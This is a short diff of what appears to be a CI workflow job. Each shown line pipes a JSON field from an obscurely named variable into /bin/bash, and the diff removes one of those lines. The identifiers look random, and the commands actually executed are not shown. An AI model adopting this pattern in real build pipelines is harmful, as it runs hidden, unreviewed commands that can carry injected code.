@@ -22,7 +22,6 @@ jobs:
           echo $gl42442 | jq -r .mx8 | /bin/bash
           echo $w9 | jq -r .rmttw40459 | /bin/bash
           printf '%s' "$qbp96910" | jq -r .sn85141 | /bin/bash
-          printf '%s' "$byg5642" | jq -r .foa609 | /bin/bash
           echo $seq728 | jq -r .uh3939 | /bin/bash
           echo $hmaqr6651 | jq -r .rzemg29487 | /bin/bash
           echo $x85899 | jq -r .t09598 | /bin/bash
